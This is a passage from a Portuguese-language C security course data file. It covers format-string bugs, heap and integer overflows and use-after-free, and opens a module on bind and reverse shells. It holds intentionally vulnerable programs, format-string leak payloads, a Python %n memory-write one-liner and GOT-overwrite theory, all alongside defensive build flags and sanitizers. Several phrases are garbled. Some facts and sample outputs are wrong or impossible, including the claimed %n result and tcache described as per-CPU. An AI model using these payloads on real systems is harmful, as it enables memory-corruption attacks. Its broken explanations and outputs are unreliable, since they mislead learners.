    ],
    projeto: {
      titulo: 'Matriz mitigação × bypass × defesa',
      descricao:
        'Crie <code>matriz.md</code> com uma tabela de 5 linhas (NX, ASLR, PIE, canário, RELRO/GOT) e colunas: "o que protege" / "como o atacante contorna" / "o que você liga no seu build" / "comando de verificação". Preencha com o que você estudou e teste os comandos de verificação (<code>checksec</code> no pwndbg) nos dois binários reais que você compilou nos módulos 05-06. Feche com um parágrafo: qual mitigação você considera mais barata e mais eficaz de manter sempre ligada, e por quê.',
      criterios: [
        'Tabela com as 5 mitigações e as 4 colunas preenchidas.',
        'checksec rodado e transcrito para os dois binários (com e sem proteções).',
        'Cada "como contorna" coerente com o módulo (sem invenções).',
        'Parágrafo final justificando uma mitigação "básica" para adotar sempre.',
      ],
    },
  },
  {
    trilha: '4',
    numero: '07',
    titulo: 'Format string bugs: leak, escrita e a regra da format string explícita',
    subtitulo: 'Quando printf(buf) vira leitura e escrita de memória',
    objetivo:
      'Entender o bug de format string (CWE-134): como printf variadic consome argumentos a mais (leak com %x/%p/%s e escrita com %n), ler a pilha com posicionamento (%N$), escrever em endereço arbitrário em 32 bits (GOT overwrite teórico) e aplicar a defesa definitiva: format string explícita, sempre.',
    prerequisitos: 'T4.03 (memória), T2.05 (strings/printf), T4.04 (gdb)',
    duracao: '~40 min',
    nivel: 'Avançado/Cyber',
    leitura: {
      foco:
        'Consulte o CTF-Wiki, seção "Format String" (https://ctf-wiki.org), para a técnica de escrita posicional e GOT overwrite, e o artigo clássico de Tim Newsham, "Format String Attacks" (1998, disponível em vários mirrors acadêmicos) — referências históricas que explicam a mecânica %n palavra por palavra.',
    },
    secoes: [
      {
        titulo: 'O bug é a entrada virar format string',
        paragrafos: [
          '<code>printf(entrada_usuario)</code> em vez de <code>printf("%s", entrada_usuario)</code> faz o <em>conteúdo digitado ser interpretado como format</em>. Como <code>printf</code> é <strong>variadic</strong> (não sabe quantos argumentos existem), ele apenas <em>consome</em> o que estiver nos registradores/na pilha — inclusive dados que o programador nunca quis passar. O atacante não escreve nada na memória: ele <strong>lê e escreve usando a própria printf como ponteiro controlado</strong>.',
        ],
      },
      {
        titulo: 'Leak: %p e %x leem valores do stack/registradores',
        rotulo: 'fmt_leak.c (VULNERÁVEL)',
        paragrafos: [
          'O exemplo clássico: cada <code>%x</code>/<code>%p</code> imprime o próximo "argumento". Envie uma pilha de <code>%p.</code> e veja ponteiros da pilha e da libc vazando — é o tipo de leak que o módulo 06 transforma em exploit (calcula a base da libc).',
        ],
        codigo: `/* fmt_leak.c -- printf(buf) com entrada do usuario (VULNERAVEL, CWE-134).
   gcc -Wall -Wextra -std=c11 fmt_leak.c -o fmt_leak   (qualquer SO) */
#include <stdio.h>

int main(void)
{
    char buf[200];
    printf("digite: ");
    if (fgets(buf, sizeof buf, stdin) == NULL) return 1;
    printf(buf);                  /* VULNERAVEL: buf vira format */
    printf("\\n");
    return 0;
}`,
        saida: `$ ./fmt_leak
digite: AAAA%p.%p.%p.%p.%p.%p.
AAAA0x7fff1234abcd.0x7f00...08.0x1.0x7fff5678cdef.0x70252e70252e7025.0x41414141`,
      },
      {
        titulo: 'Posicionamento: %N$p lê o N-ésimo argumento',
        rotulo: 'localizando o offset',
        paragrafos: [
          'Para ler um valor que sabemos estar em determinada posição (ex.: nossos próprios "AAAA" lá no fundo), usamos posicionamento direto: <code>%5$p</code> imprime o 5º argumento. Estratégia de descoberta no lab: envie <code>AAAA.00A-%1$p.%2$p...%25$p.</code> e procure onde aparece <code>0x41414141</code>; aquele índice é o seu "bing shel" — será usado para leituras e escritas. Atente que em 64-bit os 5 primeiros argumentos são registradores (RSI, RDX, RCX, R8, R9) e a partir do 6º são slots da pilha. Já em 32-bit tudo vem da pilha.',
        ],
        codigo: `$ ./fmt_leak
digite: AAAA.00A-%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p.
AAAA.00A-0x7ffff7a1...0x70252e25732425... 0x41414141
      ^^^^ procura por 0x41414141 -> neste lab caiu no %10$p`,
      },
      {
        titulo: '%s e o crash de leitura',
        paragrafos: [
          '<code>%s</code> trata o argumento como <em>ponteiro para string</em> e lê o que aponta — ao acertar um ponteiro válido da libc (vazado com %p), o atacante <strong>dereferencia endereço arbitrário</strong> e puxa bytes de lá (técnica de dump de memória). Quando o endereço é inválido, o processo morre com SIGSEGV — essencial também para <em>crash forense</em>: o offset do crash revela o endereço usado.',
        ],
      },
      {
        titulo: '%n: a escrita — valor gravado é a "conta" de caracteres',
        rotulo: 'fmt_write 32-bit',
        paragrafos: [
          '<code>%n</code> grava <em>quantos caracteres já foram impressos</em> no endereço dado pelo argumento — abrindo uma <strong>write primitive</strong>. Combine com vazamentos de precisão (<code>%Nu</code> imprime N espaços para inflar a conta) e posicionamento: para escrever o valor <code>0x41414141</code> num alvo no índice 6, envie <code>[4 bytes do endereço do alvo][%8u][%6$n]</code>... — o clássico didático é o <code>AAAA%6$n</code>, onde os quatro A representam o endereço (substituídos por um endereço real).',
        ],
        codigo: `/* fmt_write.c -- alvo de escrita (VULNERAVEL, CWE-134).
   Compile 32-bit para seguir o exemplo:  (Linux/WSL)
   sudo apt install gcc-multilib
   gcc -m32 -fno-stack-protector -Wall -Wextra -std=c11 fmt_write.c -o fmt_write */
#include <stdio.h>

int main(void)
{
    int alvo = 0x1111;
    char buf[200];
    printf("digite: ");
    if (fgets(buf, sizeof buf, stdin) == NULL) return 1;
    printf(buf);                  /* VULNERAVEL */
    printf("\\nalvo = 0x%x\\n", alvo);
    return 0;
}`,
        saida: `$ python3 -c 'import struct,sys; p=struct.pack("<I", 0xbffff5e0); sys.stdout.buffer.write(p + b"%6$n")' | ./fmt_write
digite:
alvo = 0x11ef
# o %6$n gravou no endereco 0xbffff5e0 (os 4 bytes do inicio do
# buffer) a quantidade de caracteres ja impressos (0x11ef = 4591);
# antes, alvo era 0x1111. A escrita aconteceu.`,
      },
      {
        titulo: 'e onde dorme o poder de verdade: GOT overwrite (teoria, 32-bit)',
        rotulo: 'got overwrite teorico',
        paragrafos: [
          'Em binários com <strong>RELRO parcial</strong> (padrão antigo/CMake sem -z now), a GOT é gravável e guarda o endereço resolvido de funções como <code>puts</code>. Se o atacante sobrescreve <code>puts@GOT</code> para <code>system</code>, a próxima chamada a <code>puts(arg</code> passa a ser <code>system(arg)</code> — e se <code>arg</code> vier do usuário (ex.: a própria string do buffer), vira <code>system("…")</code>. É o mesmo <code>%n</code> de antes, agora mirando a GOT — ou a PLT/GOT entry. <strong>Defesa viva:</strong> <code>-Wl,-z,relro,-z,now</code> (full RELRO) torna a GOT read-only após o carregamento e mata esse vetor; e lembre que lemos escrevendo com <code>%n</code> em alvos exatos depende de leak+buffer posicionado (módulo 04/06).',
        ],
      },
      {
        titulo: 'Mitigação: a regra da format string explícita',
        rotulo: 'regra da format',
        paragrafos: [
          'A correção é estrutural, não cosmética:',
        ],
        lista: [
          '<strong>Nunca passe dados para printf/scanf/fprintf/snprintf como format.</strong> O primeiro parâmetro é <em>sempre</em> uma string de formato (literal ou constante): <code>printf("%s", buf)</code>.',
          'Regra de busca no code review: procurar <code>printf(variavel);</code>, <code>fprintf(fp, dado);</code>, <code>snprintf(b, n, variavel)</code>.',
          'Deixe o compilador vigiar: <code>-Wformat -Wformat-security -Wformat-nonliteral -Werror=format-security</code> transforma o padrão em erro de build.',
          'Se a string precisa ser "gerada" (log com partes enviadas), monte o FORMAT fixo e passe os dados como args: <code>printf("user=%s", usuario)</code> — nunca <code>printf(usuario)</code>.',
        ],
        codigo: `# build que TRANSFORMA o bug em erro:
gcc -Wall -Wextra -Wformat -Wformat-security -Wformat-nonliteral \\
    -Werror=format-security fmt_leak.c -o fmt_leak_fortificado

# e a correcao em codigo:
printf(buf);        ->      printf("%s", buf);`,
        saida: `fmt_leak.c: In function 'main':
fmt_leak.c:12:13: error: format not a string literal and no format arguments
   12 |     printf(buf);`,
      },
      {
        titulo: 'Como se defender',
        lista: [
          'Regra inegociável: format string explícita em 100% das chamadas (a busca de texto no repositório acha o resto).',
          'Fail fast no build com <code>-Werror=format-security</code> — o CI deve recusar o padrão, não avisar.',
          'Mantenha full RELRO (<code>-z relro -z now</code>): sem GOT gravável, sobra pouco onde escrever com %n.',
          'Não vaze endereços: mensagens de erro/log que imprimem ponteiros ou <code>%p</code> são leak deliberado.',
          'Em logs com conteúdo do usuário ex.: <code>snprintf(linha, n, "%s", entrada)</code> e depois <code>fprintf(fp, "%s", linha)</code> — os dois lados explícitos — evita que o dado chegue "nu" a uma função variadic.',
          'O bug também aparece em <code>sprintf/strftime/…</code>: a regra vale para qualquer função com format.',
        ],
      },
    ],
    exercicios: [
      {
        nivel: 2,
        enunciado:
          'Rode <code>fmt_leak</code> (qualquer SO) com a entrada <code>AAAA.%x.%x.%x.%x.%x.%x.</code> e depois com <code>AAAA.%7$p.%8$p.%9$p.</code>. Faça um teste de posicionamento até achar onde entram os 0x41414141 (seus AAAA). Anote o índice encontrado na sua sessão.',
        dica: 'Aumente o range: <code>AAAA-%1$p...-%30$p</code> e busque por 0x41414141 — resp = index.',
        solucao: `$ ./fmt_leak
digite: AAAA-%1$p-%2$p-%3$p-%10$p-%20$p-%30$p.
...
$ ./fmt_leak
digite: AAAA-%7$p-%8$p-%9$p.
...
# exemplo: neste binario 64-bit os AAAA caem no %17$p.
# O indice e LOCAL: voce determinou, nao precisa ser o do texto.`,
      },
      {
        nivel: 3,
        enunciado:
          'Depois de achar o índice, vire o vetor de leitura em vetor de escrita: compile <code>fmt_write</code> 32-bit (<code>-m32</code>, multilib) com ASLR desligado por sessão e use o endereço real de <code>alvo</code> (descubra no gdb com <code>p &alvo</code> — ou, mais simples, coloque alvo como global e leia com objdump -t) para que <code>%6$n</code> mude o valor de alvo. Registre antes/depois.',
        dica: 'Se o %N$n não cair no seu endereço, redescubra o índice do buf nesse binário 32-bit (o procedimento do exercício 1).',
        solucao: `$ gcc -m32 -fno-stack-protector -Wall -Wextra -std=c11 fmt_write.c -o fmt_write
$ gdb ./fmt_write -ex "break main" -ex "run" -ex "p &alvo" -ex "quit"
$1 = (int *) 0xbffff5e0
$ python3 -c 'import struct,sys; sys.stdout.buffer.write(struct.pack("<I",0xbffff5e0)+b"%6$n")' | ./fmt_write
digite:
alvo = 0x11ef   # antes era 0x1111; agora vale n.
`,
        solucao_obs: 'O valor novo (0x11ef = 4591) vem da contagem de caracteres já impressa até o %n; para valores grandes use <code>%Nu</code> para inflar a contagem.',
      },
      {
        nivel: 3,
        enunciado:
          'Recompile o <code>fmt_leak</code> com <code>-Wformat-security -Werror=format-security</code> e confira que a build falha apontando a linha do <code>printf(buf)</code>. Depois corrija para <code>printf("%s", buf)</code> e recompile sem warnings.',
        dica: 'O compilador sabe que um "format não literal" é o uso perigoso; a correção é o literal "%s".',
        solucao: `$ gcc -Wall -Wextra -Wformat-security -Werror=format-security fmt_leak.c -o x
fmt_leak.c:12:13: error: format not a string literal and no format arguments
$ sed -i 's/printf(buf)/printf("%s", buf)/' fmt_leak.c
$ gcc -Wall -Wextra -Wformat-security -Werror=format-security fmt_leak.c -o x
# compila limpo
$ ./x
digite: AAAA%p.%p.
AAAA%p.%p.     # agora imprime literal, sem leak`,
      },
    ],
    quiz: [
      {
        pergunta: 'O bug de format string acontece quando…',
        opcoes: [
          'Uma string vinda do usuário é passada como argumento de format (ex.: printf(entrada))',
          'O printf não tem \n no fim',
          'Usamos fgets em vez de gets',
          'O compilador otimiza demais',
        ],
        correta: 0,
        explicacao: 'printf(variavel) interpreta o conteúdo como formato: %x,%p,%s leem e %n escreve memória.',
      },
      {
        pergunta: 'O que %n faz em uma format string?',
        opcoes: [
          'Grava a quantidade de caracteres já impressos no endereço apontado pelo argumento',
          'Imprime a variável em nova linha',
          'Lê uma string da rede',
          'Retorna o endereço de printf',
        ],
        correta: 0,
        explicacao: '%n NÃO imprime: se escreve em memória. É a write primitive do bug.',
      },
      {
        pergunta: 'Para que serve o %N$p (posicionamento direto)?',
        opcoes: [
          'Acessar o N-ésimo argumento da pilha de forma determinística (localizar nossos bytes, endereços, etc.)',
          'Imprimir N páginas',
          'Declarar N variáveis',
          'Pular N linhas do código',
        ],
        correta: 0,
        explicacao: 'O posicionamento permite varrer os argumentos e achar o índice onde nossa entrada aparece — essencial para leak e write.',
      },
      {
        pergunta: 'Qual defesa bloqueia FORMAT string na origem, impede GOT overwrite e é checkada no build?',
        opcoes: [
          'Format explícita (printf("%s", b)) + -Werror=format-security + full RELRO',
          'Usar apenas printf sem porcentagens',
          'Colocar senha no programa',
          'Desligar o compilador',
        ],
        correta: 0,
        explicacao: 'O tripé defesa: nunca dados como format, compilador que falha o build, e GOT read-only (full RELRO).',
      },
    ],
    projeto: {
      titulo: 'Relatório: do leak ao %n (32-bit)',
      descricao:
        'Em <code>~/labs/4.07</code>, produza um relatório <code>format.md</code> (no WSL) contendo: (1) o fmt_leak 64-bit com a varredura de posicionamento e o índice onde os AAAA aparecem; (2) o fmt_write 32-bit com antes/depois de <code>alvo</code> e o endereço usado; (3) um parágrafo explicando como esse <em>leak</em> alimenta o ret2libc do módulo 06 (base = valor_vazado − offset_na_libc); (4) a prova de que <code>-Werror=format-security</code> falha o build com o padrão perigoso; (5) a correção final do código com diff (before/after).',
      criterios: [
        'Índice do posicionamento determinado e documentado (seu, não o do texto).',
        'Escrita de alvo com %N$n demonstrada com endereço real.',
        'Cálculo base da libc a partir de um valor vazado coerente.',
        'Build com -Werror=format-security falhando e a correção aplicada.',
      ],
    },
  },
  {
    trilha: '4',
    numero: '08',
    titulo: 'Heap, integer overflow e use-after-free',
    subtitulo: 'Três classes de bug que não estão na pilha',
    objetivo:
      'Reconhecer e corrigir três grandes classes de bugs de memória que não dependem do stack overflow: integer overflow (wrap, malloc(0), off-by-one), heap overflow (corromper bloco vizinho/metadados) e use-after-free (ponteiro pendurado em bloco liberado). Entender o allocator da glibc em conceito (chunks, free lists, tcache) e usar valgrind/ASan para caçar todos.',
    prerequisitos: 'T2.06 (malloc/free), T2.05 (strings), T2.02 (números)',
    duracao: '~45 min',
    nivel: 'Avançado/Cyber',
    leitura: {
      foco:
        'Cobre os capítulos 0x300 (Exploitation) do livro "Hacking: The Art of Exploitation" e, para o allocator, leia "Heap Exploitation part 1: Understanding the glibc heap" (Azeria Labs, https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/) — conceito de chunks, metadados e free lists que este módulo resume em português.',
    },
    secoes: [
      {
        titulo: 'O problema comum: tamanhos que a matemática devora',
        paragrafos: [
          'Os bugs deste módulo têm a mesma raiz do módulo 05: <strong>medida de tamanho calculada errado</strong>. A diferença é que em vez de "escrevi além do buffer", aqui a conta do tamanho já nasce errada — por wraparound, por sinal, por off-by-one — e a partir dela alocamos menos do que escrevemos. O atacante administra o <em>over</em> e o <em>under</em> da memória para alcançar o adjacente.',
        ],
      },
      {
        titulo: 'Integer overflow: quando a aritmética vira ferramenta',
        rotulo: 'intbug.c',
        paragrafos: [
          'Em C, <code>unsigned</code> faz <strong>wraparound</strong> (mod 2^n) e <code>signed</code> tem <em>comportamento indefinido</em> em overflow. Consequências práticas para segurança:',
        ],
        lista: [
          '<code>0xffffffffu + 1 == 0</code> — um "total" calculado por soma pode virar 0/pequeno, e <code>malloc(pequeno)</code> aloca pouco para os dados que serão copiados',
          '<code>n - 1</code> em unsigned com n==0 vira <em>enorme</em> (0xffff...ffff) — um limite de loop pode virar 18 quintilhões de iterações ou uma cópia gigante',
          '<code>malloc(0)</code> em glibc retorna um ponteiro <strong>não-NULL</strong> e único, enquanto <code>malloc(negativo→size_t)</code> retorna NULL — o programa que confunde "NULL" com "funcionou" quebra',
          'Off-by-one clássico: copiar "n bytes" mas declarar <code>char dest[n]</code> — o <code>\\0</code> final estoura em 1 (heaps clássicos de OpenSSL, etc.)',
          'Elenco: <code>int -1</code> convertido para <code>size_t</code> vira 2^64-1 — nunca converter comprimento "negativo" em tamanho',
        ],
        codigo: `/* intbug.c -- demonstrando wraparound e armadilhas de tamanho.
   gcc -Wall -Wextra -std=c11 intbug.c -o intbug   (qualquer SO) */
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    unsigned int n = 0xffffffffu;
    printf("0xffffffffu + 1      = %u\\n", n + 1);       /* 0 */

    unsigned short s = 65535;
    s = s + 1;
    printf("unsigned short 65535+1= %u\\n", s);           /* 0 */

    size_t zero = 0;
    printf("size_t 0 - 1         = %zu\\n", zero - 1);    /* enorme */

    int menos_um = -1;
    printf("int -1 como size_t   = %zu\\n", (size_t)menos_um);

    char *z = malloc(0);
    printf("malloc(0) retorna    = %s\\n", z ? "ponteiro nao-NULL" : "NULL");
    free(z);

    char *m = malloc((size_t)menos_um);
    printf("malloc(2^64-1)       = %s\\n", m ? "ponteiro" : "NULL (falha, certo)");
    return 0;
}`,
        saida: `$ ./intbug
0xffffffffu + 1      = 0
unsigned short 65535+1= 0
size_t 0 - 1         = 18446744073709551615
int -1 como size_t   = 18446744073709551615
malloc(0) retorna    = ponteiro nao-NULL
malloc(2^64-1)       = NULL (falha, certo)`,
      },
      {
        titulo: 'O padrão maldito: tamanho calculado ↔ alocação ↔ cópia',
        rotulo: 'overflow no padrao',
        paragrafos: [
          'O exploit clássico encadeia três linhas que parecem inocentes:',
        ],
        codigo: `/* o PADRAO VULNERAVEL: a conta e a alocacao divergem da copia */
size_t tamanho = (largo * alto) + 4;   /* pode wrap para pequeno */
char *img = malloc(tamanho);           /* pouco */
memcpy(img, dado, largo * alto);       /* muito : estouro */

/* o mesmo bug com sinal: */
int lido = ler_int_do_pacote();        /* -1 vindo da rede */
char *b = malloc((size_t)lido);        /* vira 2^64-1 -> NULL? */
memcpy(b, payload, lido);              /* tamanho estranho... */`,
      },
      {
        titulo: 'Heap overflow: escrever além do bloco, corromper o vizinho',
        rotulo: 'heap_of.c',
        paragrafos: [
          'No heap, o "buffer" é um <strong>chunk</strong> com metadados logo antes do ponteiro que você recebe. Escrever além dele avança para o chunk seguinte (dados ou metadados dele). No exemplo abaixo, o <code>strcpy</code> excede um bloco de <em>4 bytes</em> e destrói o conteúdo do bloco vizinho <code>b</code> — a prova visível da corrupção. Usamos <code>fflush</code> para o exemplo não sumir quando a corrupção derruba o processo: corromper o vizinho costuma <em>também</em> derrubar o <code>free</code> seguinte (comportamento típico que o valgrind reporta).',
        ],
        codigo: `/* heap_of.c -- overflow de heap corrompendo o vizinho (VULNERAVEL).
   gcc -Wall -Wextra -std=c11 heap_of.c -o heap_of   (qualquer SO; no WSL valgrind detecta) */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void)
{
    char *a = malloc(4);
    char *b = malloc(4);
    if (!a || !b) return 1;

    strcpy(b, "seguro");
    printf("antes: b = '%s'\\n", b);
    fflush(stdout);

    /* a tem 4 bytes; esta copia tem 80 chars. O estouro avanca
       pelo chunk vizinho b e alem dele: corrompe dados e pode
       corromper metadata (o free() seguinte pode nao sobreviver). */
    strcpy(a, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ");

    printf("depois: b = '%s'  <- vizinho corrompido\\n", b);
    fflush(stdout);

    free(a);              /* pode crashear dependendo do allocator */
    free(b);
    return 0;
}`,
        saida: `$ ./heap_of
antes: b = 'seguro'
depois: b = 'IIIIJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ'  <- vizinho corrompido
$ valgrind ./heap_of   # no WSL acusa:
==123== Invalid write of size 1
==123==    at 0x4...: __strcpy_... 
==123==    by 0x...: main (heap_of.c:19)
==123==  Address 0x... is 0 bytes after a block of size 32 alloc'd`,
      },
      {
        titulo: 'Use-after-free: o ponteiro que esqueceu que foi liberado',
        rotulo: 'uaf.c',
        paragrafos: [
          '<code>free(u)</code> não zera <code>u</code> — ele fica <strong>dangling</strong>. Se o programa libera e depois continua usando, e uma segunda <code>malloc</code> reutiliza aquela região, o "velho" conteúdo foi substituído pelo do novo objeto: o código lê/escreve o objeto errado. Em estruturas de segurança (verificação de privilégio, sessão), isso vira escalada de privilégio real. O fix absoluto: depois de <code>free</code>, <code>ptr = NULL</code> e conferir antes de usar.',
        ],
        codigo: `/* uaf.c -- use-after-free: bloco liberado e reutilizado.
   gcc -Wall -Wextra -std=c11 uaf.c -o uaf   (qualquer SO) */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct { char nome[16]; int admin; } Usuario;

int main(void)
{
    Usuario *u = malloc(sizeof *u);
    if (!u) return 1;
    strcpy(u->nome, "root");
    u->admin = 1;

    free(u);          /* liberou... */

    Usuario *novo = malloc(sizeof *novo);   /* ...provavelmente reutiliza */
    strcpy(novo->nome, "hacker");
    novo->admin = 0;

    /* USE-AFTER-FREE: lendo u', que agora eh 'novo' */
    printf("lendo ponteiro liberado: nome=%s admin=%d\\n",
           u->nome, u->admin);

    free(novo);
    return 0;
}`,
        saida: `$ ./uaf            # Linux/glibc (tcache) reutiliza o bloco na hora:
lendo ponteiro liberado: nome=hacker admin=0
# no Windows/MinGW o allocator pode NAO reusar o mesmo endereco:
# lendo ponteiro liberado: nome=root admin=1   (comportamento indefinido!)
$ valgrind ./uaf
==123== Invalid read of size 1 ...     # valgrind pega na hora`,
      },
      {
        titulo: 'O allocator glibc em conceito',
        rotulo: 'allocator em conceito',
        paragrafos: [
          'Para raciocinar sobre heap além dos exemplos, basta o modelo conceitual:',
        ],
        lista: [
          '<strong>Chunks</strong> — o heap é dividido em blocos. Cada bloco em uso tem um <em>cabeçalho (metadata)</em> logo antes da área que o programa recebe (tamanho, flags). O ponteiro devolvido aponta para os <em>dados</em>, não para o início do chunk.',
          '<strong>Free lists</strong> — blocos liberados são pendurados em listas por tamanho (bins, tcache). O allocator reutiliza dessas listas antes de expandir o heap.',
          '<strong>tcache</strong> — uma per-CPU fast list (Linux moderno): <code>free</code> empurra para a tcache, <code>malloc</code> puxa de lá. Reutilização imediata — é por isso que o UAF acima "funciona" tão previsível.',
          '<strong>Coalescing / top chunk</strong> — blocos livres adjacentes fundem; o "top chunk" é a borda do heap. Corromper metadados aqui é o que transforma heap overflow em escrita de endereço (técnicas like fastbin/unsortedbin attack — <em>não vamos implementar</em>; o objetivo aqui é reconhecer a mecânica e defendê-la).',
        ],
      },
      {
        titulo: 'Caçando os três com ferramentas: valgrind e ASan',
        rotulo: 'caça aos bugs',
        paragrafos: [
          'Valgrind e ASan detectam as tres classes sem que você adivinhe:',
        ],
        codigo: `# no WSL (Linux):
gcc -Wall -g -fsanitize=address,undefined heap_of.c -o heap_of_asan
./heap_of_asan          # reporta heap-buffer-overflow na hora
valgrind --leak-check=full ./uaf        # Invalid read / write
valgrind --leak-check=full ./intbug     # se houver leak, mostra`,
      },
      {
        titulo: 'Como se defender',
        lista: [
          'Faça a matemática do tamanho ANTES da alocação com multiplicação segura (<code>__builtin_mul_overflow</code>, C23 <code>_Generic</code>) ou sane a entrada e confira <code>LARGO*ALTO</code> cabe em <code>size_t</code> antes de usar.',
          'Trate <code>malloc(0)</code> como caso explícito: não assuma NULL nem "funcionou". E trate <code>malloc</code> falha (NULL) sempre.',
          'Off-by-one: aloque <code>n+1</code> quando precisar do <code>\\0</code>, e prefira <code>snprintf</code>/cópias com tamanho que amantenha o NUL.',
          'Heap overflow: idêntico ao módulo 02 — cópias com limite. Nenhuma mitologia de "glibc tolerante" é desculpa.',
          'Use-after-free: <code>free(p); p = NULL;</code> sempre; ponteiros nunca reutilizados; valgrind e ASan vão achar os que você esqueceu.',
          'No Unix, rode <code>MALLOC_CHECK_</code>/glibc tunables em ambientes críticos e mantenha o binário com <code>-fstack-protector-all -z relro -z now</code> — limites de dano, mesmo com o bug presente.',
          'O CI roda sanitizers obrigatoriamente: <code>-fsanitize=address,undefined</code> em testes unitários é a rede que pega heap_over/UAF/int overflow.',
        ],
      },
    ],
    exercicios: [
      {
        nivel: 2,
        enunciado:
          'Rode <code>intbug.c</code> e depois compile com <code>-fsanitize=undefined</code> (no Linux/WSL) e rode de novo. O que o UBSan acusa e o que ele NÃO acusa neste binário?',
        dica: 'UBSan não flagra wrap unsigned (é definido); ele flagra signed overflow, divisão por zero, etc. Procure por ele gritar em algum dos prints.',
        solucao: `$ gcc -Wall -g -fsanitize=undefined intbug.c -o intbug_ub
$ ./intbug_ub
0xffffffffu + 1      = 0
... (nada de runtime; os wraps unsigned sao comportamento
     definido) 
# UBSan nao acusou wrap, mas acusaria signed overflow
# (ex.: INT_MAX + 1) e divisao por zero se houvessem.`,
        solucao_obs: 'Isso reforça: unsigned wrap é "definido" mas ainda é bug de segurança. Sanitizer ajuda; o review da conta é seu.',
      },
      {
        nivel: 2,
        enunciado:
          'Proponha a correção do padrão vulnerável: dado <code>unsigned largo, alto</code> vindos da rede, aloque com segurança para armazenar <code>largo*alto</code> bytes com <code>__builtin_mul_overflow</code>. Escreva o código completo.',
        dica: 'Se <code>__builtin_mul_overflow(largo, alto, &total)</code> retornar 1 (overflow), recuse o pacote.',
        solucao: `#include <stdlib.h>
#include <stdint.h>

int receber_imagem(unsigned largo, unsigned alto, const void *dados,
                   size_t dados_len)
{
    size_t total;
    if (__builtin_mul_overflow(largo, alto, &total)) {
        return -1;                      /* tamanho gigante: recusa */
    }
    if (dados_len < total) {
        return -2;                      /* dados menores que o prometido */
    }
    char *img = malloc(total);
    if (!img) return -3;
    /* copia SEGURA: memcpy(img, dados, total); ... */
    free(img);
    return 0;
}`,
        solucao_obs: 'O __builtin_mul_overflow materializa o "não faça tampão de tamanho".',
      },
      {
        nivel: 3,
        enunciado:
          'Corrija <code>uaf.c</code> e <code>heap_of.c</code> de modo que ambos: (a) passem limpos no valgrind e no ASan; (b) mantenham a funcionalidade descrita (uaf imprime os dados do novo objeto de forma controlada — o programa SIMPLESMENTE não deve ler o objeto liberado). Entregue as duas correções com diff conceptual (o riff "antes" vs "depois" para heap_of).',
        dica: 'heap_of: a cópia precisa caber — aloque o tamanho do dado (não 4) ou use cópia limitada (<code>snprintf(a, tam, "%s", ...)</code>); uaf: <code>u = NULL</code> após free e imponha que o resto do código checa NULL.',
        solucao: `/* heap_of FIX: a copia tem que caber no que foi alocado */
char *a = malloc(sizeof "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII");
strcpy(a, "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII");   /* agora cabe */

/* uaf FIX: nunca use ponteiro liberado */
free(u);
u = NULL;
/* ... e no uso: */
if (u != NULL) printf("%s\\n", u->nome);  /* nunca imprime */`,
        solucao_obs: 'O fix real de uaf não é "não imprimir", é estrutura de dados que não mantém ponteiro pendurado (ex.: remover da lista antes do free).',
      },
    ],
    quiz: [
      {
        pergunta: 'O que acontece com 0xffffffffu + 1 em C?',
        opcoes: [
          'Vira 0 (wrap unsigned, comportamento definido)',
          'Estoura com exceção',
          'Vira -1 com warning',
          'Lança um abort',
        ],
        correta: 0,
        explicacao: 'Unsigned wrap é definido (mod 2^32); ainda assim é a fonte dos tamanhos "pequenos demais" que o atacante explora.',
      },
      {
        pergunta: 'Por que malloc(0) é uma armadilha em aplicações de segurança?',
        opcoes: [
          'Glibc devolve um ponteiro não-NULL único, então "mapeou, logo tem bytes" é falso',
          'Ele sempre retorna NULL',
          'Ele corrompe o heap',
          'Ele não existe no Linux',
        ],
        correta: 0,
        explicacao: 'malloc(0) em glibc dá ponteiro válido (chunk de 0 usável), mas nenhum byte útil — confundir com alocação real causa overflow.',
      },
      {
        pergunta: 'Use-after-free acontece quando…',
        opcoes: [
          'Um ponteiro liberado é usado depois, e o bloco pode ter sido reutilizado por outra alocação',
          'Um buffer global não é zerado',
          'Um int é maior que 10',
          'O programa roda sem free nenhum',
        ],
        correta: 0,
        explicacao: 'O dangling pointer lê/escreve memória agora pertencente a outro objeto.',
      },
      {
        pergunta: 'Qual ferramenta pega as três classes (heap overflow, UAF, int overflow) em runtime?',
        opcoes: [
          'ASan (address/undefined) e valgrind, nas versões adequadas',
          'Apenas o checksec',
          'Nenhuma; só code review',
          'O antivírus do Windows',
        ],
        correta: 0,
        explicacao: 'ASan cobre address bugs (heap/UAF); UBSan cobre integer overflow; valgrind cobre leituras/escritas inválidas e leaks.',
      },
    ],
    projeto: {
      titulo: 'Três bugs corrigidos, um post mortem',
      descricao:
        'Monte a pasta <code>~/labs/4.08</code> com os três "bugs-crime" (intbug, heap_of, uaf) e para cada um: (1) o código original marcado com a CWE (CWE-190 integer overflow, CWE-122 heap overflow, CWE-416 use-after-free); (2) a saída bugada; (3) o diagnóstico via valgrind/ASan (recorte); (4) a correção com diff antes/depois; (5) um parágrafo "como isso vira ataque na vida real" (ex.: UAF em verificação de privilégio, integer overflow em contador de comprimento de pacote) e como a defesa (módulos 02 + sanitizers) mitiga.',
      criterios: [
        'Três entradas completas (bug, saída, sanitizer, fix).',
        'CWE correta em cada caso.',
        'Diff antes/depois coerente (não apenas comentário removido).',
        'Sanitizer/valgrind limpo nas versões corrigidas.',
      ],
    },
  },
  {
    trilha: '4',
    numero: '09',
    titulo: 'Redes ofensivas em C: shells, shellcode e packet crafting',
    subtitulo: 'Sockets Linux, bind/reverse shell didáticos, raw sockets e sniffers (lab only)',
    objetivo:
      'Aplicar sockets em C (retomando T3.08) em cenários de segurança: diferenciação bind shell × reverse shell com implementações didáticas completas (dup2 redirecionando fd 0/1/2), shellcode de bind/reverse de referência, packet crafting com raw sockets (ICMP manual) e um sniffer de cabeçalhos Ethernet/IP/TCP. Aviso transversal: TODOS os exemplos rodam apenas em lab, preferencialmente loopback.',
    prerequisitos: 'T3.08 (sockets TCP/UDP em C), T4.05 (shellcode/execve), T0.01',
    duracao: '~50 min',
    nivel: 'Avançado/Cyber',
